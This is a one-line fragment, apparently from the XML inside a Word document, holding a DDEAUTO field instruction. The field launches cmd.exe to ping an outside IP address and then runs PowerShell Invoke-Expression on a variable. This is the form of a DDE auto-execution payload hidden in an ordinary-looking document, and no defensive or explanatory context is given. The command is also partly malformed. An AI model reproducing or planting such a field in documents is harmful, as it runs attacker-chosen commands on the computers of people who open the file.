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fldSimple w:instr=" DDEAUTO c:\\windows\\system32\\cmd.exe /c ping 162.243.140.240;IEX \$e"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